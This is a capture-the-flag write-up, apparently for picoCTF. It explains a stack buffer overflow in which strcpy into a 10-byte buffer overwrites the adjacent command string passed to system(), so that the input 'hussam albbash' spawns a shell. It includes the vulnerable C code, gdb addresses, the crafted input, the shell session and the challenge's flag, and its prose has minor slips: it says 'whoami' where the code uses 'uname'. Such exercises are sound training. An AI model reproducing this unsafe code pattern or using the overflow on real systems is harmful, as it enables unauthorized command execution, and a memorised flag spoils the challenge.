Now we have this program  :

```
#include <string.h>
#include <stdio.h>
#include <stdlib.h> 

void fun(char *name, char *cmd);

int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);
    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}
void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);  
}
```
This program declares a buffer of 200 bytes , then it reades to it from stdin buffer .

**Now,the line :**
```name[strcspn(name, "\n")] = 0;```
is just like finding the index of \n , and replacing it with null byte '\0' .

Then the buffer is passed with other string literal ```whoami``` , which is obviously a linux command .

**gettting to the interesting part:**
The function declares two buffers of size 10 characters , then it uses strcpy (vulnerable function , to length checking)
to copy the passed strings to these buffers .

**Now using gdb , after setting a break point after buffer and c declaration , we have these adresses :**
```
&buffer =0x7fffffffdf9c
&w=7fffffffdfa6
```

That indicates that buffer is lower on the stack than c ,so lets try to buffer-overflow for buffer ,to overwrite c with a shell invoking command :

**Note that the differnce between the two adresses is 10 ,so they are contagious ,
we craft this input based on that fact :
```
hussam albbash   (hussamalb for the first buffer , so , bash will overflow to the next ).
```

Finally running that on the server gives us :
```
What is your name?
hussam albbash
Goodbye, hussam albbash!
ls -la
total 16
drwxr-xr-x 1 ctf-player ctf-player   22 Sep 30 23:29 .
drwxr-xr-x 1 root       root         24 Sep 30 23:29 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 ctf-player ctf-player  807 Feb 25  2020 .profile
-r-------- 1 ctf-player ctf-player   34 Sep 30 23:29 flag.txt
cat flag.txt	
picoCTF{0v3rfl0w_c0mm4nd_3766e70a}

```


**And that`s it , it was a good exercise .**